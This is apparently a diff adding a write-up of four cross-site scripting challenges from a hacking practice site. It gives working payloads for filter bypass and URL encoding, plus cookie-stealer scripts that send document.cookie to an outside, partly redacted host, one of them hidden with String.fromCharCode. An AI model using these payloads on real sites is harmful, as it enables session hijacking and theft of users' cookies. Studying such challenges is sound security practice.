@@ -1,0 +1,25 @@
+1 Basic Injection
+	Usually in the search box, you can inject anything in there, for this, I use the injection:
+<<SCRIPT>document.vulnerable=true;//<</SCRIPT> since that it filters out the “<” so I put the << that way it filters out the first << becoming < still be able to inject the code anyways!
+
+2 User Agent Injection
+	The message shows your IP and User Agent – ahh! User Agent can be used to inject XSS code, I use this injection to steal cookies!
+	Be sure to have cookie stealer code on your server or somewhere else.
+My stealer injection:
+<script language="JavaScript">window.location= "http://www.xxxxxxxxxxxxxx.com/aboutus/dustin/developer/danger/cookie.php?c=" + document.cookie;</script>
+and my cookie caught this data: admin=5bf84d
+now create the cookie with this value, refresh to beat this!
+
+3 fromCharCode 
+	In the URL , index.php?<injection> will reveal the contents in the file and is being filtered by charcode by encoding it in charCodeAt() then decode it again to bypass the filter!
+Injection:
+	index.php/"><meh><script>document.location= String.fromCharCode(34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, xxxxxxxxxxx 46, 99, 111, 109, 47, 97, 98, 111, 117, 116, 117, 115, 47, 100, 117, 115, 116, 105, 110, 47, 100, 101, 118, 101, 108, 111, 112, 101, 114, 47, 100, 97, 110, 103, 101, 114, 47, 99, 111, 111, 107, 105, 101, 46, 112, 104, 112, 63, 99, 61, 34)+document.cookie;</script>
+
+	notice the previous injection with my cookie stealer link, you simply encode it in charCodeAt() to get the numbers then put it in the String.fromCharCode(numbes) to use!
+
+	And the cookie caught the data: SESSIONZ=65832fbe25955a552fd68b857d1ac1a7
+	Create cookie with that data and refresh to beat it!
+
+4 Basic Filter Evasion
+	when you type in something in the search box, it shows up in the url – hmm lets inject some XSS with this injection: <SCRIPT>document.vulnerable%3Dtrue%3B<%2FSCRIPT>
+in the url and beat it!
